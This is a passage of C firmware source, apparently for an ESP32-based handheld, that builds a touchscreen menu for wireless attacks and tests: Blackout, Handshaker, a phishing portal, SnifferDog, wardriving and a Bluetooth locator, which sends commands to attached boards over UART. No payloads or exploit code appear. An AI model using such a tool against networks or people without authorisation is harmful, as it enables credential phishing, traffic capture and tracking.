        lv_obj_set_style_text_color(mac_lbl, lv_color_hex(0x888888), 0);
    }
    
    // RSSI display box
    lv_obj_t *rssi_box = lv_obj_create(content);
    lv_obj_set_size(rssi_box, 250, 150);
    lv_obj_set_style_bg_color(rssi_box, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_color(rssi_box, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_border_width(rssi_box, 3, 0);
    lv_obj_set_style_radius(rssi_box, 16, 0);
    lv_obj_set_style_pad_all(rssi_box, 15, 0);
    lv_obj_set_flex_flow(rssi_box, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(rssi_box, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(rssi_box, LV_OBJ_FLAG_SCROLLABLE);
    
    bt_locator_rssi_label = lv_label_create(rssi_box);
    lv_label_set_text_fmt(bt_locator_rssi_label, "%d dBm", dev->rssi);
    lv_obj_set_style_text_font(bt_locator_rssi_label, &lv_font_montserrat_44, 0);
    if (dev->rssi > -50) {
        lv_obj_set_style_text_color(bt_locator_rssi_label, COLOR_MATERIAL_GREEN, 0);
    } else if (dev->rssi > -70) {
        lv_obj_set_style_text_color(bt_locator_rssi_label, COLOR_MATERIAL_AMBER, 0);
    } else {
        lv_obj_set_style_text_color(bt_locator_rssi_label, COLOR_MATERIAL_RED, 0);
    }
    
    lv_obj_t *rssi_title = lv_label_create(rssi_box);
    lv_label_set_text(rssi_title, "Signal Strength");
    lv_obj_set_style_text_font(rssi_title, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(rssi_title, lv_color_hex(0x888888), 0);
    
    // Start tracking
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "scan_bt %s", bt_locator_target_mac);
    ESP_LOGI(TAG, "[BT_LOC] Sending UART command: '%s'", cmd);
    uart_send_command_for_tab(cmd);
    ESP_LOGI(TAG, "[BT_LOC] Command sent, starting monitor task");
    
    bt_locator_tracking = true;
    
    // Also mark in context
    tab_context_t *loc_ctx = get_current_ctx();
    if (loc_ctx) {
        loc_ctx->bt_locator_tracking = true;
    }
    
    xTaskCreate(bt_locator_tracking_task, "bt_locator", 4096, (void*)loc_ctx, 5, &bt_locator_task_handle);
    ESP_LOGI(TAG, "[BT_LOC] Monitor task created, tracking_page=%p, rssi_label=%p", 
             (void*)bt_locator_page, (void*)bt_locator_rssi_label);
    
    // Set current visible page
    ctx->current_visible_page = ctx->bt_locator_page;
}

// Global attack tile event handler
static void global_attack_tile_event_cb(lv_event_t *e)
{
    const char *attack_name = (const char *)lv_event_get_user_data(e);
    ESP_LOGI(TAG, "Global attack tile clicked: %s", attack_name);
    
    // Handle Blackout attack
    if (strcmp(attack_name, "Blackout") == 0) {
        show_blackout_confirm_popup();
        return;
    }
    
    // Handle SnifferDog attack
    if (strcmp(attack_name, "Snifferdog") == 0) {
        show_snifferdog_confirm_popup();
        return;
    }
    
    // Handle Handshaker attack (global - all networks)
    if (strcmp(attack_name, "Handshakes") == 0) {
        show_global_handshaker_confirm_popup();
        return;
    }
    
    // Handle Phishing Portal attack
    if (strcmp(attack_name, "Portal") == 0) {
        // Check SD card before opening Phishing Portal popup
        if (!current_tab_has_sd_card()) {
            show_sd_warning_popup(show_phishing_portal_popup);
            return;
        }
        show_phishing_portal_popup();
        return;
    }
    
    // Handle Wardrive attack
    if (strcmp(attack_name, "Wardrive") == 0) {
        // Check SD card before opening Wardrive page
        if (!current_tab_has_sd_card()) {
            show_sd_warning_popup(show_wardrive_page);
            return;
        }
        show_wardrive_page();
        return;
    }
}

// Show Global WiFi Attacks page
static void show_global_attacks_page(void)
{
    // Get current tab's data and container
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // If page already exists for this tab, just show it
    if (ctx->global_attacks_page) {
        lv_obj_clear_flag(ctx->global_attacks_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->global_attacks_page;
        global_attacks_page = ctx->global_attacks_page;  // Update legacy reference
        ESP_LOGI(TAG, "Showing existing global attacks page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new global attacks page for tab %d", current_tab);
    
    // Create global attacks page container inside tab container
    ctx->global_attacks_page = lv_obj_create(container);
    global_attacks_page = ctx->global_attacks_page;  // Keep legacy reference
    lv_obj_set_size(global_attacks_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(global_attacks_page, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(global_attacks_page, 0, 0);
    lv_obj_set_style_pad_all(global_attacks_page, 16, 0);
    lv_obj_set_flex_flow(global_attacks_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(global_attacks_page, 12, 0);
    
    // Header with back button and title
    lv_obj_t *header = lv_obj_create(global_attacks_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 12, 0);
    
    // Back button
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title - use "Tests" instead of "Attacks" when Red Team is disabled
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, enable_red_team ? "Global WiFi Attacks" : "Global WiFi Tests");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_RED, 0);
    
    // Tiles container
    lv_obj_t *tiles = lv_obj_create(global_attacks_page);
    lv_obj_set_size(tiles, lv_pct(100), lv_pct(100));
    lv_obj_set_flex_grow(tiles, 1);
    lv_obj_set_style_bg_color(tiles, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 20, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
    
    // Create attack tiles (some only visible when Red Team enabled)
    
    // Blackout - Red (dangerous) - Red Team only
    if (enable_red_team) {
        create_tile(tiles, LV_SYMBOL_POWER, "Blackout", COLOR_MATERIAL_RED, global_attack_tile_event_cb, "Blackout");
    }
    
    // Handshaker - Amber - Red Team only
    if (enable_red_team) {
        create_tile(tiles, LV_SYMBOL_DOWNLOAD, "Handshaker", COLOR_MATERIAL_AMBER, global_attack_tile_event_cb, "Handshakes");
    }
    
    // Portal - Orange (always visible)
    create_tile(tiles, LV_SYMBOL_WIFI, "Portal", COLOR_MATERIAL_ORANGE, global_attack_tile_event_cb, "Portal");
    
    // SnifferDog - Purple - Red Team only
    if (enable_red_team) {
        create_tile(tiles, LV_SYMBOL_EYE_OPEN, "SnifferDog", COLOR_MATERIAL_PURPLE, global_attack_tile_event_cb, "Snifferdog");
    }
    
    // Wardrive - Teal (always visible)
    create_tile(tiles, LV_SYMBOL_GPS, "Wardrive", COLOR_MATERIAL_TEAL, global_attack_tile_event_cb, "Wardrive");
    
    // Set current visible page
    ctx->current_visible_page = ctx->global_attacks_page;
}

//==================================================================================
// Settings Page
//==================================================================================

// Settings popup variables
static __attribute__((unused)) lv_obj_t *settings_popup_overlay = NULL;
static __attribute__((unused)) lv_obj_t *settings_popup_obj = NULL;

// NVS keys
#define NVS_NAMESPACE "settings"
#define NVS_KEY_RED_TEAM        "red_team"
#define NVS_KEY_SCREEN_TIMEOUT  "scr_timeout"
#define NVS_KEY_SCREEN_BRIGHT   "scr_bright"

// Load Red Team setting from NVS (called on startup)
// Note: Device detection is automatic via ping/pong
static void load_red_team_from_nvs(void)
{
    nvs_handle_t nvs;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READONLY, &nvs);
    if (err == ESP_OK) {
        // Load red_team setting
        uint8_t red_team = 0;
        err = nvs_get_u8(nvs, NVS_KEY_RED_TEAM, &red_team);
        if (err == ESP_OK) {
            enable_red_team = (red_team != 0);
            ESP_LOGI(TAG, "Loaded Red Team from NVS: %s", enable_red_team ? "Enabled" : "Disabled");
        } else {
            ESP_LOGI(TAG, "No Red Team in NVS, using default: Disabled");
        }
        
        nvs_close(nvs);
    } else {
        ESP_LOGI(TAG, "NVS not available, using default: Red Team=Disabled");
    }
}

// Save Red Team setting to NVS
static void save_red_team_to_nvs(bool enabled)
{
    nvs_handle_t nvs;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &nvs);
    if (err == ESP_OK) {
        nvs_set_u8(nvs, NVS_KEY_RED_TEAM, enabled ? 1 : 0);
        nvs_commit(nvs);
        nvs_close(nvs);
        ESP_LOGI(TAG, "Saved Red Team to NVS: %s", enabled ? "Enabled" : "Disabled");
    } else {
        ESP_LOGE(TAG, "Failed to open NVS for writing Red Team: %s", esp_err_to_name(err));
    }
}

// Load screen settings from NVS (called on startup)
static void load_screen_settings_from_nvs(void)
{
    nvs_handle_t nvs;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READONLY, &nvs);
    if (err == ESP_OK) {
        // Load screen timeout setting
        uint8_t timeout = 1;
        err = nvs_get_u8(nvs, NVS_KEY_SCREEN_TIMEOUT, &timeout);
        if (err == ESP_OK && timeout <= 4) {
            screen_timeout_setting = timeout;
            ESP_LOGI(TAG, "Loaded Screen Timeout from NVS: %d", screen_timeout_setting);
        } else {
            ESP_LOGI(TAG, "No Screen Timeout in NVS, using default: 30s");
        }
        
        // Load screen brightness setting
        uint8_t brightness = 80;
        err = nvs_get_u8(nvs, NVS_KEY_SCREEN_BRIGHT, &brightness);
        if (err == ESP_OK && brightness >= 1 && brightness <= 100) {
            screen_brightness_setting = brightness;
            ESP_LOGI(TAG, "Loaded Screen Brightness from NVS: %d%%", screen_brightness_setting);
        } else {
            ESP_LOGI(TAG, "No Screen Brightness in NVS, using default: 80%%");
        }
        
        nvs_close(nvs);
    } else {
        ESP_LOGI(TAG, "NVS not available, using default screen settings");
    }
}

// Save screen timeout setting to NVS
static void save_screen_timeout_to_nvs(uint8_t setting)
{
    nvs_handle_t nvs;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &nvs);
    if (err == ESP_OK) {
        nvs_set_u8(nvs, NVS_KEY_SCREEN_TIMEOUT, setting);
        nvs_commit(nvs);
        nvs_close(nvs);
        ESP_LOGI(TAG, "Saved Screen Timeout to NVS: %d", setting);
    } else {
        ESP_LOGE(TAG, "Failed to open NVS for writing Screen Timeout: %s", esp_err_to_name(err));
    }
}

// Save screen brightness setting to NVS
static void save_screen_brightness_to_nvs(uint8_t brightness)
{
    nvs_handle_t nvs;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &nvs);
    if (err == ESP_OK) {
        nvs_set_u8(nvs, NVS_KEY_SCREEN_BRIGHT, brightness);
        nvs_commit(nvs);
        nvs_close(nvs);
        ESP_LOGI(TAG, "Saved Screen Brightness to NVS: %d%%", brightness);
    } else {
        ESP_LOGE(TAG, "Failed to open NVS for writing Screen Brightness: %s", esp_err_to_name(err));
    }
}

// Get UART1 pins - fixed to Grove connector
static void get_uart1_pins(int *tx_pin, int *rx_pin)
{
    // UART1 always uses Grove connector
    *tx_pin = 53;
    *rx_pin = 54;
}

// Get UART2 pins - fixed to M5Bus connector
static void get_uart2_pins(int *tx_pin, int *rx_pin)
{
    // UART2 always uses M5Bus connector
    *tx_pin = 37;
    *rx_pin = 38;
}

// Initialize UART2 (fixed to M5Bus connector)
static void init_uart2(void)
{
    if (uart2_initialized) {
        return;
    }
    
    int tx_pin, rx_pin;
    get_uart2_pins(&tx_pin, &rx_pin);
    
    uart_config_t uart_config = {
        .baud_rate = UART_BAUD_RATE,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };
    
    ESP_ERROR_CHECK(uart_driver_install(UART2_NUM, UART_BUF_SIZE * 2, 0, 0, NULL, 0));
    ESP_ERROR_CHECK(uart_param_config(UART2_NUM, &uart_config));
    ESP_ERROR_CHECK(uart_set_pin(UART2_NUM, tx_pin, rx_pin, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE));
    
    uart2_initialized = true;
    ESP_LOGI(TAG, "[MBus] Initialized: TX=%d, RX=%d (M5Bus)", tx_pin, rx_pin);
}

// Deinitialize UART2 (MBus)
static __attribute__((unused)) void deinit_uart2(void)
{
    if (!uart2_initialized) {
        return;
    }
    
    uart_driver_delete(UART2_NUM);
    uart2_initialized = false;
    ESP_LOGI(TAG, "[MBus] Deinitialized");
}

//==================================================================================
// Board Detection via ping/pong protocol
//==================================================================================

// Send ping and wait for pong response on specified transport
static bool ping_uart(uart_port_t uart_port, const char *uart_name)
{
    uint8_t rx_buffer[64];
    
    // Flush any existing data
    uart_flush(uart_port);
    
    // Send ping command
    const char *ping_cmd = "ping\r\n";
    transport_write_bytes(uart_port, ping_cmd, strlen(ping_cmd));
    ESP_LOGI(TAG, "[%s] Sent ping", uart_name);
    
    // Wait for pong response (up to 500ms)
    int total_len = 0;
    int64_t start_time = esp_timer_get_time();
    int64_t timeout_us = 500000; // 500ms
    
    while ((esp_timer_get_time() - start_time) < timeout_us) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, 
                                   sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(50));
        if (len > 0) {
            total_len += len;
            rx_buffer[total_len] = '\0';
            
            // Check if we received "pong"
            if (strstr((char*)rx_buffer, "pong") != NULL) {
                log_memory_stats(uart_name);
                ESP_LOGI(TAG, "[%s] Received pong - board detected!", uart_name);
                return true;
            }
        }
    }
    
    ESP_LOGW(TAG, "[%s] No pong response - board not detected", uart_name);
    return false;
}

// Send ping and wait for pong response using raw UART (bypass USB transport)
static bool ping_uart_direct(uart_port_t uart_port, const char *uart_name)
{
    uint8_t rx_buffer[64];

    uart_flush(uart_port);

    const char *ping_cmd = "ping\r\n";
    uart_write_bytes(uart_port, ping_cmd, strlen(ping_cmd));
    ESP_LOGI(TAG, "[%s] Sent ping (raw)", uart_name);

    int total_len = 0;
    int64_t start_time = esp_timer_get_time();
    int64_t timeout_us = 500000;

    while ((esp_timer_get_time() - start_time) < timeout_us) {
        int len = uart_read_bytes(uart_port, rx_buffer + total_len,
                                  sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(50));
        if (len > 0) {
            total_len += len;
            rx_buffer[total_len] = '\0';
            if (strstr((char*)rx_buffer, "pong") != NULL) {
                log_memory_stats(uart_name);
                ESP_LOGI(TAG, "[%s] Received pong - board detected!", uart_name);
                return true;
            }
        }
    }

    ESP_LOGW(TAG, "[%s] No pong response - board not detected", uart_name);
    return false;
}

// Detect connected boards via ping/pong - 3 independent devices
static void detect_boards(void)
{
    ESP_LOGI(TAG, "=== Starting board detection ===");

    // Ensure USB CDC host is started before detection
    usb_transport_init();

    // Detect each device independently using ping/pong
    grove_detected = ping_uart_direct(UART_NUM, "Grove");
    usb_detected = usb_cdc_connected ? ping_usb() : false;  // Must respond to ping, not just be connected
    if (usb_cdc_connected && !usb_detected && usb_debug_logs) {
        usb_log_cdc_state("detect_boards_usb_ping_failed");
    }
    uart1_detected = (grove_detected || usb_detected);  // For legacy compatibility
    mbus_detected = ping_uart(UART2_NUM, "MBus");

    // Log detection results (ping functions already log success)
    if (grove_detected) {
        ESP_LOGI(TAG, "[Grove] Device detected");
    }
    if (mbus_detected) {
        ESP_LOGI(TAG, "[MBus] Device detected");
    }
    if (!grove_detected && !usb_detected && !mbus_detected) {
        ESP_LOGW(TAG, "No devices detected!");
    }
    
    ESP_LOGI(TAG, "=== Board detection complete: Grove=%s, USB=%s, MBus=%s ===",
             grove_detected ? "YES" : "NO",
             usb_detected ? "YES" : "NO",
             mbus_detected ? "YES" : "NO");
}

// Check SD card presence on a specific tab by sending 'list_sd' command
// Returns true if SD card is present, false otherwise
static bool check_sd_card_for_tab(tab_id_t tab)
{
    if (tab == TAB_INTERNAL) {
        // For internal tab, check if Tab5's SD card is mounted
        struct stat st;
        bool mounted = (stat("/sdcard", &st) == 0);
        ESP_LOGI(TAG, "[INTERNAL] SD card %s", mounted ? "mounted" : "NOT mounted");
        return mounted;
    }
    
    // Determine UART port for this tab
    uart_port_t uart_port = uart_port_for_tab(tab);
    const char *tab_name = tab_transport_name(tab);
    
    ESP_LOGI(TAG, "[%s] Checking SD card presence...", tab_name);
    
    // Try up to 3 times with 2 second delays between attempts
    for (int attempt = 1; attempt <= 3; attempt++) {
        if (attempt > 1) {
            ESP_LOGI(TAG, "[%s] Retrying SD card check (attempt %d/3)...", tab_name, attempt);
            vTaskDelay(pdMS_TO_TICKS(2000)); // 2 second delay between retries
        }
        
        // Send list_sd command
        const char *cmd = "list_sd\r\n";
        transport_write_bytes_tab(tab, uart_port, cmd, strlen(cmd));
        vTaskDelay(pdMS_TO_TICKS(1000));
        
        // Read response with timeout (up to 4 seconds, SD init can be slow)
        static char rx_buffer[512];
        int total_len = 0;
        uint32_t start_time = xTaskGetTickCount();
        uint32_t timeout_ticks = pdMS_TO_TICKS(4000);
        
        while ((xTaskGetTickCount() - start_time) < timeout_ticks && total_len < (int)sizeof(rx_buffer) - 1) {
            int len = transport_read_bytes_tab(tab, uart_port, rx_buffer + total_len, 
                                               sizeof(rx_buffer) - 1 - total_len, pdMS_TO_TICKS(100));
            if (len > 0) {
                total_len += len;
                rx_buffer[total_len] = '\0';
                ESP_LOGI(TAG, "[%s] Received %d bytes (total: %d): '%.*s'", tab_name, len, total_len, len, rx_buffer + total_len - len);
                
                // Check for success or failure patterns
                if (strstr(rx_buffer, "HTML files found on SD card") != NULL) {
                    ESP_LOGI(TAG, "[%s] SD card detected (HTML files found) on attempt %d/3", tab_name, attempt);
                    return true;
                }
                if (strstr(rx_buffer, "Failed to initialize SD card") != NULL) {
                    ESP_LOGW(TAG, "[%s] SD card init failed on attempt %d/3", tab_name, attempt);
                    ESP_LOGW(TAG, "[%s] Full response buffer (%d bytes): '%s'", tab_name, total_len, rx_buffer);
                    break; // Try again after delay
                }
            }
        }
        
        // Timeout without clear response on this attempt
        ESP_LOGW(TAG, "[%s] SD card check timeout on attempt %d/3", tab_name, attempt);
        ESP_LOGW(TAG, "[%s] Full response buffer (%d bytes): '%s'", tab_name, total_len, rx_buffer);
    }
    
    // All 3 attempts failed - assume no SD card
    ESP_LOGW(TAG, "[%s] SD card NOT detected after 3 attempts", tab_name);
    return false;
}

// Check SD cards on all detected UARTs and Tab5 internal
static void check_all_sd_cards(void)
{
    ESP_LOGI(TAG, "=== Checking SD cards ===");
    
    // Check each detected UART
    if (grove_detected) {
        grove_ctx.sd_card_present = check_sd_card_for_tab(TAB_GROVE);
    } else {
        grove_ctx.sd_card_present = false;
    }
    
    if (usb_detected) {
        usb_ctx.sd_card_present = check_sd_card_for_tab(TAB_USB);
    } else {
        usb_ctx.sd_card_present = false;
    }
    
    if (mbus_detected) {
        mbus_ctx.sd_card_present = check_sd_card_for_tab(TAB_MBUS);
    } else {
        mbus_ctx.sd_card_present = false;
    }
    
    // Check Tab5's own SD card
    internal_sd_present = check_sd_card_for_tab(TAB_INTERNAL);
    internal_ctx.sd_card_present = internal_sd_present;
    
    ESP_LOGI(TAG, "=== SD card check complete: Grove=%s, USB=%s, MBus=%s, Internal=%s ===",
             grove_ctx.sd_card_present ? "YES" : "NO",
             usb_ctx.sd_card_present ? "YES" : "NO",
             mbus_ctx.sd_card_present ? "YES" : "NO",
             internal_sd_present ? "YES" : "NO");
}

// Forward declarations for popup
static void show_main_tiles(void);

// Close the "No Board Detected" popup
static void board_detect_popup_close_cb(lv_event_t *e)
{
    ESP_LOGI(TAG, "User closed 'No Board Detected' popup");
    
    // Stop retry timer
    if (board_detect_retry_timer) {
        lv_timer_del(board_detect_retry_timer);
        board_detect_retry_timer = NULL;
    }
    
    // Close popup
    if (board_detect_overlay) {
        lv_obj_del(board_detect_overlay);
        board_detect_overlay = NULL;
        board_detect_popup = NULL;
    }
    
    board_detection_popup_open = false;
    
    // Show main tiles even without boards (user chose to continue)
    show_main_tiles();
}

// Retry board detection callback (called every 1s while popup is open)
static void board_detect_retry_cb(lv_timer_t *timer)
{
    if (!board_detection_popup_open) {
        // Popup was closed, stop timer
        if (board_detect_retry_timer) {
            lv_timer_del(board_detect_retry_timer);
            board_detect_retry_timer = NULL;
        }
        return;
    }
    
    ESP_LOGI(TAG, "Retrying board detection...");
    
    // Try detection again
    detect_boards();
    
    // If any board detected, close popup and show main tiles
    if (uart1_detected || mbus_detected) {
        ESP_LOGI(TAG, "Board detected! Closing popup and showing main UI.");
        
        // Stop retry timer
        if (board_detect_retry_timer) {
            lv_timer_del(board_detect_retry_timer);
            board_detect_retry_timer = NULL;
        }
        
        // Close popup
        if (board_detect_overlay) {
            lv_obj_del(board_detect_overlay);
            board_detect_overlay = NULL;
            board_detect_popup = NULL;
        }
        
        board_detection_popup_open = false;
        
        // Reload GUI to reflect detected config and show main tiles
        reload_gui_for_detection();
        show_main_tiles();
    }
}

// Show "No Board Detected" popup with retry logic
static void show_no_board_popup(void)
{
    ESP_LOGI(TAG, "Showing 'No Board Detected' popup");
    
    board_detection_popup_open = true;
    
    lv_obj_t *scr = lv_scr_act();
    
    // Create modal overlay
    board_detect_overlay = lv_obj_create(scr);
    lv_obj_remove_style_all(board_detect_overlay);
    lv_obj_set_size(board_detect_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(board_detect_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(board_detect_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(board_detect_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(board_detect_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup container
    board_detect_popup = lv_obj_create(board_detect_overlay);
    lv_obj_set_size(board_detect_popup, 400, 280);
    lv_obj_center(board_detect_popup);
    lv_obj_set_style_bg_color(board_detect_popup, lv_color_hex(0x2D2D2D), 0);
    lv_obj_set_style_border_color(board_detect_popup, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_border_width(board_detect_popup, 3, 0);
    lv_obj_set_style_radius(board_detect_popup, 16, 0);
    lv_obj_set_style_pad_all(board_detect_popup, 24, 0);
    lv_obj_set_flex_flow(board_detect_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(board_detect_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(board_detect_popup, 16, 0);
    lv_obj_clear_flag(board_detect_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Warning icon
    lv_obj_t *icon = lv_label_create(board_detect_popup);
    lv_label_set_text(icon, LV_SYMBOL_WARNING);
    lv_obj_set_style_text_font(icon, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(icon, COLOR_MATERIAL_AMBER, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(board_detect_popup);
    lv_label_set_text(title, "No Board Detected");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, lv_color_hex(0xFFFFFF), 0);
    
    // Subtitle
    lv_obj_t *subtitle = lv_label_create(board_detect_popup);
    lv_label_set_text(subtitle, "Connect ESP32-C5 board via UART");
    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(subtitle, lv_color_hex(0xAAAAAA), 0);
    
    // Status label (shows retry status)
    lv_obj_t *status = lv_label_create(board_detect_popup);
    lv_label_set_text(status, "Retrying every 1 second...");
    lv_obj_set_style_text_font(status, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(status, lv_color_hex(0x888888), 0);
    
    // Close button
    lv_obj_t *close_btn = lv_btn_create(board_detect_popup);
    lv_obj_set_size(close_btn, 160, 50);
    lv_obj_set_style_bg_color(close_btn, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_add_event_cb(close_btn, board_detect_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *btn_label = lv_label_create(close_btn);
    lv_label_set_text(btn_label, "Continue Anyway");
    lv_obj_set_style_text_font(btn_label, &lv_font_montserrat_14, 0);
    lv_obj_center(btn_label);
    
    // Start retry timer (1 second interval)
    board_detect_retry_timer = lv_timer_create(board_detect_retry_cb, 3000, NULL);
    ESP_LOGI(TAG, "Started board detection retry timer (3s interval)");
}

//==================================================================================
// Portal icon update
//==================================================================================

// Update portal icon visibility and color based on portal state
static void update_portal_icon(void)
{
    if (portal_icon == NULL) return;
    
    // Show portal icon whenever portal is active
    if (portal_active) {
        lv_obj_clear_flag(portal_icon, LV_OBJ_FLAG_HIDDEN);
        // Green when new data available, orange otherwise
        if (portal_new_data_count > 0) {
            lv_obj_set_style_text_color(portal_icon, COLOR_MATERIAL_GREEN, 0);
    } else {
            lv_obj_set_style_text_color(portal_icon, COLOR_MATERIAL_ORANGE, 0);
        }
    } else {
        lv_obj_add_flag(portal_icon, LV_OBJ_FLAG_HIDDEN);
    }
}


// ======================= Scan Time Settings =======================

// Helper function to read channel_time value from a specific UART
static int read_channel_time_from_uart(uart_port_t uart_port, const char *param)
{
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "channel_time read %s", param);
    
    // Flush and send command
    uart_flush(uart_port);
    transport_write_bytes(uart_port, cmd, strlen(cmd));
    transport_write_bytes(uart_port, "\r\n", 2);
    ESP_LOGI(TAG, "[UART%d] Sent command: %s", uart_port == UART_NUM ? 1 : 2, cmd);
    
    // Read response (numeric value expected)
    char rx_buffer[64];
    int total_len = 0;
    int retries = 5;
    
    while (retries-- > 0 && total_len < (int)sizeof(rx_buffer) - 1) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(100));
        if (len > 0) {
            total_len += len;
        }
        if (len <= 0 && total_len > 0) break;  // Got data, no more coming
    }
    
    if (total_len > 0) {
        rx_buffer[total_len] = '\0';
        
        // Parse line by line to find the numeric response (skip command echo)
        char *line = strtok(rx_buffer, "\r\n");
        while (line != NULL) {
            // Skip leading whitespace
            while (*line == ' ') line++;
            
            // Check if line starts with a digit
            if (isdigit((unsigned char)*line)) {
                int value = atoi(line);
                if (value > 0) {
                    ESP_LOGI(TAG, "[UART%d] Read channel_time %s = %d", uart_port == UART_NUM ? 1 : 2, param, value);
                    return value;
                }
            }
            line = strtok(NULL, "\r\n");
        }
    }
    
    ESP_LOGW(TAG, "[UART%d] Failed to read channel_time %s", uart_port == UART_NUM ? 1 : 2, param);
    return -1; // Error/timeout
}

// Scan Time popup variables - 3 independent device sections
static lv_obj_t *scan_time_popup_overlay = NULL;
static lv_obj_t *scan_time_popup_obj = NULL;
static lv_obj_t *scan_time_grove_min_spinbox = NULL;
static lv_obj_t *scan_time_grove_max_spinbox = NULL;
static lv_obj_t *scan_time_usb_min_spinbox = NULL;
static lv_obj_t *scan_time_usb_max_spinbox = NULL;
static lv_obj_t *scan_time_mbus_min_spinbox = NULL;
static lv_obj_t *scan_time_mbus_max_spinbox = NULL;
static lv_obj_t *scan_time_error_label = NULL;

static void scan_time_popup_close_cb(lv_event_t *e)
{
    if (scan_time_popup_overlay) {
        lv_obj_del(scan_time_popup_overlay);
        scan_time_popup_overlay = NULL;
        scan_time_popup_obj = NULL;
        scan_time_grove_min_spinbox = NULL;
        scan_time_grove_max_spinbox = NULL;
        scan_time_usb_min_spinbox = NULL;
        scan_time_usb_max_spinbox = NULL;
        scan_time_mbus_min_spinbox = NULL;
        scan_time_mbus_max_spinbox = NULL;
        scan_time_error_label = NULL;
    }
}

static void scan_time_save_cb(lv_event_t *e)
{
    char cmd[64];
    
    // Validate and send Grove settings
    if (grove_detected && scan_time_grove_min_spinbox && scan_time_grove_max_spinbox) {
        int min_val = lv_spinbox_get_value(scan_time_grove_min_spinbox);
        int max_val = lv_spinbox_get_value(scan_time_grove_max_spinbox);
        
        if (min_val >= max_val) {
            if (scan_time_error_label) {
                lv_label_set_text(scan_time_error_label, "Error: Grove min must be < max");
            }
            return;
        }
        
        // Send to Grove via UART1
        uart_flush(UART_NUM);
        snprintf(cmd, sizeof(cmd), "channel_time set min %d", min_val);
        uart_write_bytes(UART_NUM, cmd, strlen(cmd));
        uart_write_bytes(UART_NUM, "\r\n", 2);
